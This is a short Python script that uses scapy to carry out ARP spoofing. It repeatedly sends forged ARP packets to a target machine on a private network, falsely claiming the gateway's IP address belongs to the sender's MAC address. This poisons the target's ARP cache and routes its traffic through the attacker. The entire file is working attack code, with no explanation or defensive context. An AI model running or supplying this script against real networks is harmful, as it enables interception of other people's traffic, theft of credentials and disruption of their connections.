#coding:utf-8
from scapy.all import *


#network interface card
interFACE = "eth0"
#IP-Target
tip = "192.168.106.130"
#IP-Location
lip = "192.168.106.120"
#IP-Gateways
gip = "192.168.106.2"
tmac = getmacbyip(tip)
lmac = get_if_hwaddr(interFACE)
gmac = getmacbyip(gip)

pack = Ether(dst=tmac,src=lmac) / ARP(op=1,hwsrc=lmac,psrc=gip,hwdst=tmac,pdst=tip)



while 1:
	sendp(pack,inter=2,iface=interFACE)
